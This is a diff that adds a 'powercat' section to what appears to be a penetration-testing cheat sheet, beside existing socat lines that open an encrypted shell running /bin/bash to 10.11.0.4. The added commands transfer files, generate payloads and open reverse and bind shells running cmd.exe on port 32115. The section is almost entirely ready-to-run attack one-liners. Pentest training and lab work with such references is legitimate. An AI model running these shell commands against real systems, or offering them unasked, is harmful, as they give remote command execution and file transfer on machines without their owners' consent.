@@ -256,6 +256,18 @@ sudo socat OPENSSL-LISTEN:32115,cert=shell.pem,verify=0,fork EXEC:/bin/bash
 socat - OPENSSL:10.11.0.4:32115,verify=0
 ```
 
+### powercat
+```
+[transfer files]
+powercat -c 127.0.0.1 -p 32115 -i C:\temp\file.exe
+powercat -c 127.0.0.1 -p 32115 -e cmd.exe -g > C:\temp\file.exe
+powercat -c 127.0.0.1 -p 32115 -e cmd.exe -ge > file.exe
+
+[reverse shell]
+powercat -c 127.0.0.1 -p 32115 -e cmd.exe
+powercat -l -p 32115 -e cmd.exe
+```
+
 ### [SCP Transfer]
 ```
 Local to Remote
